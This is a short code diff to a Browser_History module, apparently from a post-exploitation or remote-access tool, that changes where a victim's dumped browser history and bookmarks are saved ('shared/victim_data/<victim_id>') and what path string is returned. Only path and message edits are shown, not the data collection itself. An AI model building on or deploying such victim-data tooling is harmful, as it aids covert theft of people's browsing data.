@@ -13,7 +13,7 @@ class Browser_History(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'path' : 'Path to dump the history and bookmarks.' 
+			'path' : 'Path to dump the history and bookmarks. Default is shared/victim_data/<victim_id>.' 
 		}
 		return h
 
@@ -30,7 +30,7 @@ class Browser_History(Module):
 
 
 		## Default Dumping path
-		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../victim_data',victim_id)
+		dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../shared/victim_data',victim_id)
 
 		if not os.path.exists(dump_path):
 			os.makedirs(dump_path)
@@ -48,7 +48,7 @@ class Browser_History(Module):
 		print(output,file=f)
 
 		## In DB or in logs only indicate where the output is stored
-		output = 'Info saved to '+file_path
+		output = file_path
 
 		return output
     
